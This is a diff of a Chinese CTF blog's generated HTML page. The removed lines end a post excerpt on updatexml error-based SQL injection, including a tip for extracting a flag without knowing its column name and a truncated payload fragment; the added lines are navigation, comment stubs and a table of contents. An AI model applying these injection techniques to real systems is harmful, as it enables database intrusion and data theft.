-但是updatexml这种报错注入方式显示的信息有长度限制，而且这里不知道flag表当中flag的列名，关于无列名注入的问题，直接用子查询就能绕过
-获取完整的flag:
-uname=1&apos;) an...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/12/07</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2021/10/21/php反序列化原生类/" title= "php反序列化原生类">
+                    <div class="prevTitle">php反序列化原生类</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -524,6 +585,24 @@ uname=1&apos;) an...
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-bilibili-1024挑战赛"><span class="toc-number">1.</span> <span class="toc-text">2021 bilibili 1024挑战赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安全攻防"><span class="toc-number">1.0.1.</span> <span class="toc-text">安全攻防</span></a></li></ol></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -2174,6 +2253,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
